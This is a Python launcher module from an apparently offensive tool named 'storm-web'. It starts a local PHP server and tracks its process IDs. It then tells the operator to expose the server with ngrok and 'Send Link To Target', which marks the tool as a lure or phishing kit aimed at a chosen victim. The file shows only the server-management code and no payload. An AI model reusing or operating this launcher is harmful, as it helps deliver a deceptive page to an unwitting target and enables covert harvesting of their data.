from colorama import Fore, Back, Style
import hashlib
import json
import os
import signal
import subprocess
import time


def _settings_path():
    return os.path.join("storm-web", "Settings.json")


def kill_php_proc():
    settings_path = _settings_path()
    if not os.path.exists(settings_path):
        return

    with open(settings_path, "r") as jsonFile:
        data = json.load(jsonFile)
        pid = data.get("pid", [])

    for process_id in pid:
        try:
            os.kill(process_id, signal.SIGTERM)
        except (ProcessLookupError, PermissionError, OSError):
            pass

    data["pid"] = []
    with open(settings_path, "w") as jsonFile:
        json.dump(data, jsonFile)


def md5_hash():
    str2hash = time.strftime("%Y-%m-%d-%H:%M", time.gmtime())
    result = hashlib.md5(str2hash.encode())
    return result


def run_php_server(port):
    log_dir = os.path.join("storm-web", "log")
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, f"php-{md5_hash().hexdigest()}.log")
    with open(log_path, "w") as php_log:
        proc = subprocess.Popen(
            ("php", "-S", f"localhost:{port}", "-t", "storm-web"),
            stderr=php_log,
            stdout=php_log,
        )
        proc_info = proc.pid

    settings_path = _settings_path()
    with open(settings_path, "r") as jsonFile:
        data = json.load(jsonFile)

    data.setdefault("pid", [])
    data["pid"].append(proc_info)

    with open(settings_path, "w") as jsonFile:
        json.dump(data, jsonFile)

    print(Fore.RED + " [+] " + Fore.GREEN + "Web Panel Link : " + Fore.WHITE + f"http://localhost:{port}")
    print(Fore.RED + "\n [+] " + Fore.LIGHTCYAN_EX + f"Please Run NGROK On Port {port} AND Send Link To Target > " + Fore.YELLOW + Back.BLACK + f"ngrok http {port}\n" + Style.RESET_ALL)


